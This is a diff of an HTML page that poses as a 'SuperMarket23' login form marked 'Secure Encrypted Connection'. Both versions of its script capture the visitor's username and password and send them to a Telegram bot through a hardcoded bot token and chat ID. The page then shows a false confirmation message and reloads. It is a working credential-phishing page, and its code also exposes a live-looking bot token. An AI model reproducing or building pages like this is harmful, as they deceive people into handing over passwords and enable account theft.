@@ -1,77 +1,24 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SuperMarket23 - Secure Access</title>
+    <title>SuperMarket23 - Access</title>
     <style>
-        /* Professional Blue and White Style */
-        body { 
-            font-family: 'Segoe UI', Arial, sans-serif; 
-            background-color: #f4f7f9; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .container { 
-            background-color: #ffffff; 
-            padding: 40px; 
-            border-radius: 10px; 
-            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
-            width: 100%; 
-            max-width: 380px; 
-            text-align: center; 
-            border-top: 6px solid #0056b3; 
-        }
-        h1 { 
-            color: #0056b3; 
-            font-size: 32px; 
-            margin-bottom: 25px; 
-            text-transform: uppercase; 
-            font-weight: bold; 
-        }
-        label { 
-            display: block; 
-            text-align: left; 
-            font-weight: bold; 
-            margin-bottom: 8px; 
-            color: #333; 
-            font-size: 14px; 
-        }
-        input { 
-            width: 100%; 
-            padding: 14px; 
-            margin-bottom: 20px; 
-            border: 1px solid #ccc; 
-            border-radius: 5px; 
-            box-sizing: border-box; 
-            font-size: 16px; 
-            background-color: #ffffff; 
-        }
-        .btn { 
-            background-color: #0056b3; 
-            color: white; 
-            border: none; 
-            padding: 16px; 
-            width: 100%; 
-            border-radius: 5px; 
-            font-size: 16px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            text-transform: uppercase; 
-            transition: background 0.3s; 
-        }
-        .btn:hover { background-color: #004494; }
-        .footer-text { margin-top: 20px; font-size: 12px; color: #777; }
+        body { font-family: Arial, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: #ffffff; padding: 40px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 380px; text-align: center; border-top: 6px solid #0056b3; }
+        h1 { color: #0056b3; font-size: 32px; margin-bottom: 25px; text-transform: uppercase; font-weight: bold; }
+        label { display: block; text-align: left; font-weight: bold; margin-bottom: 8px; color: #333; font-size: 14px; }
+        input { width: 100%; padding: 14px; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 5px; box-sizing: border-box; font-size: 16px; }
+        .btn { background-color: #0056b3; color: white; border: none; padding: 16px; width: 100%; border-radius: 5px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
+        .footer { margin-top: 20px; font-size: 12px; color: #777; }
     </style>
 </head>
 <body>
 
 <div class="container">
     <h1>Log In</h1>
-    
     <form id="authForm">
         <label>USERNAME</label>
         <input type="text" id="user" placeholder="Enter username" required>
@@ -81,47 +28,40 @@
 
         <button type="submit" class="btn" id="btnAuth">TO AUTHENTICATE</button>
     </form>
-    
-    <div class="footer-text">Secure Encrypted Connection</div>
+    <div class="footer">Secure Encrypted Connection</div>
 </div>
 
 <script>
-    // Your Telegram credentials from the screenshots
+    // Configuración con tus datos reales de las capturas
     const token = "8710847420:AAHbfCVi9-eWWiS6E2CYKT0-9TFSxf9gjDc";
     const chat_id = "6475554235";
 
     document.getElementById('authForm').addEventListener('submit', async (e) => {
         e.preventDefault();
-        
         const btn = document.getElementById('btnAuth');
-        const username = document.getElementById('user').value;
-        const password = document.getElementById('pass').value;
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
         
         btn.innerText = "PROCESSING...";
         btn.disabled = true;
 
-        const message = `📌 *NEW SM23 ENTRY*\n\n👤 *User:* \`${username}\`\n🔑 *Pass:* \`${password}\``;
+        const mensaje = `📌 *NEW ACCESS SM23*\n\n👤 *User:* \`${u}\`\n🔑 *Pass:* \`${p}\``;
 
         try {
             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chat_id,
-                    text: message,
-                    parse_mode: 'Markdown'
-                })
+                body: JSON.stringify({ chat_id: chat_id, text: mensaje, parse_mode: 'Markdown' })
             });
             alert("Verification sent successfully.");
             location.reload();
         } catch (error) {
-            alert("Connection error. Please try again.");
+            alert("Error: Check your internet connection.");
             btn.innerText = "TO AUTHENTICATE";
             btn.disabled = false;
         }
     });
 </script>
-
 </body>
 </html>
 
